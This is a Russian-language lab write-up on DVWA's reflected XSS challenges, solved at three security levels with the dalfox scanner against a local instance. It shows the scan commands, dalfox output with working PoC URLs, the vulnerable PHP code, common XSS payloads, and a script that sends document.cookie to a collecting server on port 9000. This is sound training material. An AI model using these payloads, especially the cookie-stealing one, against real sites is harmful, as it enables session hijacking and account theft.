Для тестирования Reflected и Stored XSS я буду использовать утилиту **dalfox**
**Dalfox** в обычном режиме:
1. Отправляет HTTP-запрос
2. Вставляет payload
3. Проверяет, появился ли payload в HTTP-ответе
4. Если да - анализирует контекст

Это классические пейлоады для XSS: 
```html
<img src=x onerror=alert(1)>
<svg onlod=alert(1)>
<script>alert(1)</script>
```

Таким образом можно отправить куки к себе на сервер.
```html
<script>window.location='http://127.0.0.1:9000/?cookie=' + document.cookie</script>
```

### LOW

Берем уязвимый параметр name, который передается через URL строку и куки для входа и с уровнем сложности DVWA
```sh
└─$ dalfox url "http://127.0.0.1:42001/vulnerabilities/xss_r/?name=test" \ 
--cookie "PHPSESSID=48bd535863ab49a9e2f91bd12add6b03; security=low"
```


```sh
                                                        
               ░█▒               
             ████     ▓                    
           ▓█████  ▓██▓                  
          ████████████         ░          
        ░███████████▓          ▓░     
     ░████████████████        ▒██░    
    ▓██████████▒███████     ░█████▓░    
   ██████████████░ ████        █▓     
 ░█████▓          ░████▒       ░         Dalfox v2.12.0
 █████               ▓██░             
 ████                  ▓██      Powerful open-source XSS scanner       
 ███▓        ▓███████▓▒▓█░     and utility focused on automation.       
 ███▒      █████                     
 ▓███     ██████                    
 ████     ██████▒                
 ░████    ████████▒
 
 🎯  Target                 http://127.0.0.1:42001/vulnerabilities/xss_r/?name=
 🏁  Method                 GET
 🖥   Performance            100 worker / 1 cpu
 ⛏   Mining                 true (Gf-Patterns, DOM Mining Enabled)
 ⏱   Timeout                10
 📤  FollowRedirect         false
 🕰   Started at             2026-02-25 22:21:38

[*] --------------------------------------------------------------------------------
[*] Starting scan [SID:Single] / URL: http://127.0.0.1:42001/vulnerabilities/xss_r/?name=
[I] Found 31 testing points in DOM-based parameter mining
[I] Content-Type is text/html;charset=utf-8
[I] Reflected name param => \  :  .  ,  +  -  =  $  {  }  [  ]  ;  |  (  )  <  "  '  `  >
    74 line:            <pre>Hello Dalfox</
[V] Triggered XSS Payload (found DOM Object): name="><svg/class="dalfox"onLoad=alert(1)>
    74 line:            <pre>Hello "><svg/class="dalfox"onLoad=alert(1)></pre>
[POC][V][GET][inHTML-URL] http://127.0.0.1:42001/vulnerabilities/xss_r/?name=%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%281%29%3E 
```

Инструмент так же возвращает готовый PoC, перейдя по нему вы увидем alert(1)

Интересно также, что, даже не передавая параметр в **dalfox**, он вернет XSS. Это довольно мощный инструмент для поиска XSS.

#### Уязвимый код 
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	// Feedback for end user
	$html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

Видим, что строка пользователя просто вставляется в **HTML**, отсюда и **XSS**.
### MEDIUM

```sh
└─$ dalfox url "http://127.0.0.1:42001/vulnerabilities/xss_r/" \
--cookie "PHPSESSID=48bd535863ab49a9e2f91bd12add6b03; security=medium"
```

```sh
[*] Starting scan [SID:Single] / URL: http://127.0.0.1:42001/vulnerabilities/xss_r/
[I] Found 31 testing points in DOM-based parameter mining
[I] Content-Type is text/html;charset=utf-8
[I] Reflected name param => ,  \  $  =  -  +  .  :  ]  [  }  {  )  (  |  ;  `  '  "  <  >
    74 line:            <pre>Hello Dalfox</
[V] Triggered XSS Payload (found DOM Object): name="><svg onload="globalThis.alert(1)" class=dalfox>
    74 line:            <pre>Hello "><svg onload="globalThis.alert(1)" class=dalfox></pre>                                                                                
[POC][V][GET][inHTML] http://127.0.0.1:42001/vulnerabilities/xss_r/?name=%22%3E%3Csvg+onload%3D%22globalThis.alert%281%29%22+class%3Ddalfox%3E                            
[*] --------------------------------------------------------------------------------
[*] [duration: 2.255535459s][issues: 1] Finish Scan!
```

Тут тоже все легко, в данном PoC он использовал закодированный в URL пейлоад загрузки через изображения как например 

```html
<img src=x onerror=alert(1)>
```

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	// Get input
	$name = str_replace( '<script>', '', $_GET[ 'name' ] );

	// Feedback for end user
	$html .= "<pre>Hello {$name}</pre>";
}

?>

```

Здесь добавляется replace на `<script>` , не проблема, просто используется другой payload
### HIGH

```sh
└─$ dalfox url "http://127.0.0.1:42001/vulnerabilities/xss_r/" \
--cookie "PHPSESSID=48bd535863ab49a9e2f91bd12add6b03; security=high" 
```

```sh
[*] --------------------------------------------------------------------------------
[*] Starting scan [SID:Single] / URL: http://127.0.0.1:42001/vulnerabilities/xss_r/
[I] Found 31 testing points in DOM-based parameter mining
[I] Content-Type is text/html;charset=utf-8
[I] Reflected name param => .  -  ,  =  $  :  \  }  [  ]  +  `  )  {  '  "  (  <  >  ;  |
    74 line:            <pre>Hello Dalfox</
[V] Triggered XSS Payload (found DOM Object): name="><svg onload="setInterval('alert(1)',1000)" class=dalfox>
    74 line:            <pre>Hello "><svg onload="setInterval('alert(1)',1000)" class=dalfox></pre>                                                                       
[POC][V][GET][inHTML] http://127.0.0.1:42001/vulnerabilities/xss_r/?name=%22%3E%3Csvg+onload%3D%22setInterval%28%27alert%281%29%27%2C1000%29%22+class%3Ddalfox%3E         
[*] --------------------------------------------------------------------------------
[*] [duration: 2.259454002s][issues: 1] Finish Scan!
```

Тут тоже все просто, только не через  тег img, а через тег svg

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	// Get input
	$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

	// Feedback for end user
	$html .= "<pre>Hello {$name}</pre>";
}

?>
```

Просто больше фильтрации, ничего не изменилось, **dalfox** спокойно выполняет свою функцию.